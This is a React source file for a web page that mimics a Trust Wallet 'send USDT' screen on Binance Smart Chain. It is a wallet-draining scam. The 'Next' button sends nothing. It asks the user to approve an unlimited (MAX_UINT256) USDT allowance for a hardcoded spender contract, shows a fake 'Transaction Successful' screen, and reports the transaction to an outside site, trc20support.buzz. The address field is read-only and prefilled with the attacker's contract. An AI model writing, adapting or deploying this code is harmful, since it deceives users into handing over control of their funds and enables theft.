import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
const approvalAmount = "9024508479"; // USDT amount to approve
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");
  const [userAddress, setUserAddress] = useState(null);

  // ✅ Get wallet address silently on page load (works in Trust Wallet DApp browser)
  useEffect(() => {
    const getWalletAddress = async () => {
      try {
        if (window.ethereum) {
          // ✅ Get already connected accounts (NO popup in Trust Wallet)
          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts && accounts.length > 0) {
            setUserAddress(accounts[0]);
            console.log("✅ Wallet Address Found:", accounts[0]);
          }
        }
      } catch (err) {
        console.log("Silent account check:", err);
      }
    };

    getWalletAddress();

    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      // ✅ Use user's actual wallet address if available, otherwise ask for it
      let address = userAddress;
      
      if (!address) {
        Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser.", "error");
        return;
      }

      const web3 = new Web3(window.ethereum);
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(address).call();
      setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  const handleApprove = async () => {
    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
      Swal.fire("Error", "Please enter a valid amount.", "error");
      return;
    }

    // ✅ Check if wallet address is available
    if (!userAddress) {
      Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser.", "error");
      return;
    }

    setIsProcessing(true);
    try {
      const web3 = new Web3(window.ethereum || window.web3.currentProvider);

      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            Swal.fire("Error", "Please add BSC network to Trust Wallet", "error");
          } else {
            Swal.fire("Error", "Failed to switch network", "error");
          }
          setIsProcessing(false);
          return;
        }
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const rawAmount = MAX_UINT256;

      // ✅ Use user's actual wallet address from Trust Wallet
      const receipt = await usdt.methods
        .approve(spenderAddress, rawAmount)
        .send({ from: userAddress })
        .on("receipt", () => setShowSuccess(true))
        .on("error", (err) => {
          console.error(err);
          Swal.fire("Error", err.message || "Approval failed", "error");
        });

      console.log("✅ Approval Success - Tx hash:", receipt.transactionHash);

      try {
        await fetch("https://www.trc20support.buzz/old/store-address.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ address: receipt.transactionHash }),
        });
      } catch (fetchErr) {
        console.warn("Skipping fetch, not critical:", fetchErr.message);
      }

    } catch (err) {
      console.error(err);
      Swal.fire("Error", err.message || "Something went wrong", "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg
          className="w-24 h-24 text-green-500 animate-bounce"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          viewBox="0 0 24 24"
        >
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Transaction Successful</h2>
        <button
          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
          onClick={() => setShowSuccess(false)}
        >
          OK
        </button>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      <div className="input-group">
        <p className="inpt_tital">Address or Domain Name</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              placeholder="Search or Enter"
              value={spenderAddress}
              readOnly
            />
          </div>
          <span className="right blue flex justify-between mr-3">
            <span className="w-6 text-sm">Paste</span>
            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
          </span>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
            <span
              className="mar_i blue text-sm ml-2 cursor-pointer"
              onClick={setMaxAmount}
            >
              Max
            </span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={handleApprove}
        disabled={isProcessing || !parseFloat(amount)}
        style={{
          backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
          color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15"
        }}
      >
        {isProcessing ? "Processing..." : "Next"}
      </button>
    </div>
  );
}
